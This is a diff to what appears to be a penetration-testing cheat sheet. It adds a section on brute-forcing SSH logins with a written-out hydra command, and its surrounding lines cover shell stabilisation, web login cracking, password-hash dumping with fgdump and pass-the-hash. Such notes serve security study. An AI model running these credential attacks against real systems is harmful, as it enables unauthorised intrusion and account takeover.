@@ -1011,6 +1011,13 @@ METHOD: Locate process-killing script and edit it.
 2. Edit the script so it won't kill the service.
 3. Your shell should be stable now.
 
+__Brute Forcing SSH__
+
+Find usernames via. smb enum etc. -> brute force users:
+```bash
+$ hydra -L users -P 10_million_password_list_top_1000.txt -t 4 192.168.1.69 ssh -vv
+```
+
 __Cracking Web Pages__
 
 Basic Authentication (e.g. /xampp logins):
@@ -1047,7 +1054,6 @@ Dump password hashes:
 * `fgdump.exe`: dump password hashes and cached credentials.
 
 Pass-the-hash:
-
 
 
 __ZIP Files__
